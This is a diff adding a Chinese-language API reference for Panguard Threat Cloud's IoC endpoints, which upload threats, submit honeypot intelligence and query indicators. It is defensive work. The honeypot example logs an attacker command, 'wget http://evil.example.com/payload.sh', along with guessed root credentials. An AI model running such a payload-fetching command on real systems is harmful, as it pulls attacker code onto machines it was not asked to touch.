@@ -1,0 +1,342 @@
+---
+title: "IoC 端點"
+description: "上傳威脅情報和從 Threat Cloud 查詢入侵指標（IoC）。"
+icon: "crosshairs"
+---
+
+IoC（入侵指標）端點允許您從代理上傳威脅資料，以及查詢集體情報資料庫。
+
+## POST /api/threats
+
+從代理或外部來源上傳威脅資料。支援單筆和批次提交。
+
+<ParamField body="threats" type="object[]" required>
+  威脅物件陣列（每次請求最多 100 筆）。
+</ParamField>
+
+<ParamField body="threats[].type" type="string" required>
+  IoC 類型：`ip`、`domain`、`hash`、`url`、`email`、`cve`。
+</ParamField>
+
+<ParamField body="threats[].value" type="string" required>
+  指標值（例如 IP 位址、網域名稱、檔案雜湊）。
+</ParamField>
+
+<ParamField body="threats[].source" type="string" required>
+  來源識別碼（例如 `guard-agent`、`honeypot`、`manual`）。
+</ParamField>
+
+<ParamField body="threats[].category" type="string">
+  威脅類別：`malware`、`botnet`、`phishing`、`bruteforce`、`scanner`、`exploit`、`c2`。
+</ParamField>
+
+<ParamField body="threats[].severity" type="string">
+  嚴重程度：`low`、`medium`、`high`、`critical`。
+</ParamField>
+
+<ParamField body="threats[].confidence" type="number">
+  信心分數（0.0--1.0）。
+</ParamField>
+
+<ParamField body="threats[].metadata" type="object">
+  額外的中繼資料（埠、協定、MITRE ATT&CK ID 等）。
+</ParamField>
+
+<Tabs>
+  <Tab title="單筆威脅">
+    ```bash
+    curl -X POST https://tc.panguard.ai/api/threats \
+      -H "Authorization: Bearer YOUR_API_KEY" \
+      -H "Content-Type: application/json" \
+      -d '{
+        "threats": [
+          {
+            "type": "ip",
+            "value": "198.51.100.42",
+            "source": "guard-agent",
+            "category": "bruteforce",
+            "severity": "high",
+            "confidence": 0.95,
+            "metadata": {
+              "port": 22,
+              "protocol": "ssh",
+              "attempts": 500,
+              "mitreId": "T1110"
+            }
+          }
+        ]
+      }'
+    ```
+  </Tab>
+  <Tab title="批次上傳">
+    ```bash
+    curl -X POST https://tc.panguard.ai/api/threats \
+      -H "Authorization: Bearer YOUR_API_KEY" \
+      -H "Content-Type: application/json" \
+      -d '{
+        "threats": [
+          {
+            "type": "ip",
+            "value": "198.51.100.42",
+            "source": "guard-agent",
+            "category": "bruteforce",
+            "severity": "high"
+          },
+          {
+            "type": "domain",
+            "value": "malware-c2.example.net",
+            "source": "honeypot",
+            "category": "c2",
+            "severity": "critical"
+          },
+          {
+            "type": "hash",
+            "value": "e3b0c44298fc1c149afbf4c8996fb924",
+            "source": "guard-agent",
+            "category": "malware",
+            "severity": "critical"
+          }
+        ]
+      }'
+    ```
+  </Tab>
+</Tabs>
+
+<ResponseExample>
+```json 201
+{
+  "ok": true,
+  "data": {
+    "received": 3,
+    "new": 2,
+    "updated": 1,
+    "iocIds": ["ioc_a1b2", "ioc_c3d4", "ioc_e5f6"]
+  }
+}
+```
+</ResponseExample>
+
+<Info>
+批次上傳每次請求接受最多 **100 筆威脅**。對於更大的量，請分成多次請求。重複的 IoC 會自動合併 -- 它們的聲譽分數、觀測計數和中繼資料會被更新而不是建立重複項目。
+</Info>
+
+---
+
+## POST /api/trap-intel
+
+提交從 Panguard Trap（蜜罐）部署收集的情報。由於蜜罐互動的特性，此資料會獲得較高的信心加成。
+
+<ParamField body="trapId" type="string" required>
+  蜜罐實例識別碼。
+</ParamField>
+
+<ParamField body="attackerIp" type="string" required>
+  攻擊者的 IP 位址。
+</ParamField>
+
+<ParamField body="honeypotType" type="string" required>
+  蜜罐類型：`ssh`、`http`、`ftp`、`smtp`、`custom`。
+</ParamField>
+
+<ParamField body="interactions" type="object[]" required>
+  攻擊者互動記錄陣列。
+</ParamField>
+
+<ParamField body="credentials" type="object[]">
+  攻擊者嘗試的憑證。
+</ParamField>
+
+<ParamField body="payloads" type="string[]">
+  任何投放酬載的 SHA-256 雜湊。
+</ParamField>
+
+<CodeGroup>
+```bash cURL
+curl -X POST https://tc.panguard.ai/api/trap-intel \
+  -H "Authorization: Bearer YOUR_API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "trapId": "trap-ssh-01",
+    "attackerIp": "198.51.100.42",
+    "honeypotType": "ssh",
+    "interactions": [
+      {
+        "timestamp": "2026-03-07T08:00:00Z",
+        "action": "login_attempt",
+        "data": { "username": "root", "password": "admin123" }
+      },
+      {
+        "timestamp": "2026-03-07T08:00:05Z",
+        "action": "command_executed",
+        "data": { "command": "wget http://evil.example.com/payload.sh" }
+      }
+    ],
+    "credentials": [
+      { "username": "root", "password": "admin123" },
+      { "username": "admin", "password": "password" }
+    ],
+    "payloads": ["a7ffc6f8bf1ed76651c14756a061d662f580ff4de43b49fa82d80a4b80f8434a"]
+  }'
+```
+</CodeGroup>
+
+<ResponseExample>
+```json 201
+{
+  "ok": true,
+  "data": {
+    "iocId": "ioc_trap_x1y2",
+    "reputationDelta": -15,
+    "campaignMatch": "campaign_botnet_xyz"
+  }
+}
+```
+</ResponseExample>
+
+---
+
+## GET /api/iocs
+
+使用篩選器搜尋 IoC 資料庫。
+
+<ParamField query="type" type="string">
+  依 IoC 類型篩選：`ip`、`domain`、`hash`、`url`、`email`、`cve`。
+</ParamField>
+
+<ParamField query="source" type="string">
+  依來源篩選（例如 `guard-agent`、`honeypot`、`community`）。
+</ParamField>
+
+<ParamField query="minReputation" type="number">
+  最低聲譽分數（0--100，其中 0 為最惡意）。
+</ParamField>
+
+<ParamField query="maxReputation" type="number">
+  最高聲譽分數。
+</ParamField>
+
+<ParamField query="status" type="string">
+  依狀態篩選：`active`、`expired`、`whitelisted`。
+</ParamField>
+
+<ParamField query="category" type="string">
+  依威脅類別篩選。
+</ParamField>
+
+<ParamField query="since" type="string">
+  回傳此 ISO 8601 時間戳之後更新的 IoC。
+</ParamField>
+
+<ParamField query="page" type="number" default="1">
+  頁碼。
+</ParamField>
+
+<ParamField query="limit" type="number" default="50">
+  每頁結果數（最大 200）。
+</ParamField>
+
+<CodeGroup>
+```bash cURL
+curl -X GET "https://tc.panguard.ai/api/iocs?type=ip&minReputation=0&maxReputation=30&status=active&limit=10" \
+  -H "Authorization: Bearer YOUR_API_KEY"
+```
+</CodeGroup>
+
+<ResponseExample>
+```json 200
+{
+  "ok": true,
+  "data": [
+    {
+      "value": "198.51.100.42",
+      "type": "ip",
+      "reputation": 12,
+      "category": "bruteforce",
+      "source": "guard-agent",
+      "sightings": 47,
+      "firstSeen": "2026-02-15T10:00:00.000Z",
+      "lastSeen": "2026-03-07T08:15:00.000Z",
+      "status": "active",
+      "metadata": {
+        "ports": [22, 3389],
+        "protocols": ["ssh", "rdp"],
+        "mitreIds": ["T1110"]
+      }
+    }
+  ],
+  "pagination": {
+    "total": 1423,
+    "page": 1,
+    "limit": 10,
+    "pages": 143
+  }
+}
+```
+</ResponseExample>
+
+---
+
+## GET /api/iocs/:value
+
+依值查詢單一 IoC。支援 IP 位址、網域、雜湊、URL、email 和 CVE ID。
+
+<ParamField path="value" type="string" required>
+  要查詢的 IoC 值。如有必要請進行 URL 編碼。
+</ParamField>
+
+<CodeGroup>
+```bash cURL
+curl -X GET "https://tc.panguard.ai/api/iocs/198.51.100.42" \
+  -H "Authorization: Bearer YOUR_API_KEY"
+```
+</CodeGroup>
+
+<Tabs>
+  <Tab title="200 找到">
+    ```json
+    {
+      "ok": true,
+      "data": {
+        "value": "198.51.100.42",
+        "type": "ip",
+        "reputation": 12,
+        "category": "bruteforce",
+        "sightings": 47,
+        "firstSeen": "2026-02-15T10:00:00.000Z",
+        "lastSeen": "2026-03-07T08:15:00.000Z",
+        "status": "active",
+        "sources": ["guard-agent", "honeypot", "community"],
+        "campaigns": ["campaign_botnet_xyz"],
+        "relatedIocs": [
+          { "value": "malware-c2.example.net", "type": "domain", "relation": "contacted" }
+        ],
+        "metadata": {
+          "asn": "AS64496",
+          "country": "CN",
+          "ports": [22, 3389],
+          "mitreIds": ["T1110", "T1078"]
+        }
+      }
+    }
+    ```
+  </Tab>
+  <Tab title="404 未找到">
+    ```json
+    {
+      "ok": true,
+      "data": {
+        "value": "192.0.2.1",
+        "type": "ip",
+        "reputation": 80,
+        "status": "unknown",
+        "sightings": 0,
+        "message": "No threat data found for this indicator"
+      }
+    }
+    ```
+  </Tab>
+</Tabs>
+
+<Tip>
+單一查詢端點回傳豐富的資料，包括相關 IoC、攻擊活動關聯和地理中繼資料。用於特定指標的詳細調查。
+</Tip>
